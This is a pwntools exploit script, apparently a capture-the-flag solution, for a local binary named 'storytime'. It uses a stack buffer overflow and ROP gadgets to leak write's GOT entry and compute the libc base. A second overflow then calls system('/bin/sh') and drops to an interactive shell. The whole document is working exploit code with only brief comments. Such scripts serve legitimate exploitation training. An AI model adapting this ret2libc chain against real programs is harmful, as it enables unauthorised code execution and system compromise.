from pwn import *

target = process('./storytime')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


# pop rsi ; pop r15 ; ret
popRsiR15 = p64(0x400701)
# pop rdi ; ret
popRdi = p64(0x400703)
# Got address of write
writeGot = p64(0x601018)

# end function: mov edi, 1; call sym.imp.write; pop rbp; ret
writeFunc = p64(0x400601)

# Filler to reach the return address
payload = b"0"*0x38

# Pop the got entry of write into r15
payload += popRsiR15
payload += writeGot                 # pop to rsi
payload += p64(0x3030303030303030)  # pop to r15(meaningless)

# Right before write call in end
payload += writeFunc                # mov edi, 1; call 

# Filler value that will be popped off in end
payload += p64(0x3030303030303030)

# Address of climax, we will exploit another buffer overflow to use the rop gadget
payload += p64(0x40060e)

# Send the payload
target.sendline(payload)

# Scan in some of the output
print(target.recvuntil("Tell me a story: \n"))

# Scan in and filter out the libc infoleak, calculate base of libc
leak = u64(target.recv(8))
base = leak - libc.symbols["write"]
print(hex(base))


offsetSystem = 0x45880		# hex(libc_elf.symbols['system'])	
offsetBinsh = 0x194882		# hex(next(libc_elf.search(b'/bin/sh')))	

systemLibc = base + offsetSystem
binshLibc = base + offsetBinsh

# Make the payload for the onshot gadget
payload = b"1"*0x38

# Calculate the oneshot gadget
payload += popRdi # Pop "/bin/sh" into the rdi register, where it expects it's argument (single char pointer)
payload += p64(binshLibc) # Address to '/bin/sh'
payload += p64(systemLibc) # Libc address of system


# Send it and get a shell
target.sendline(payload)
target.interactive()
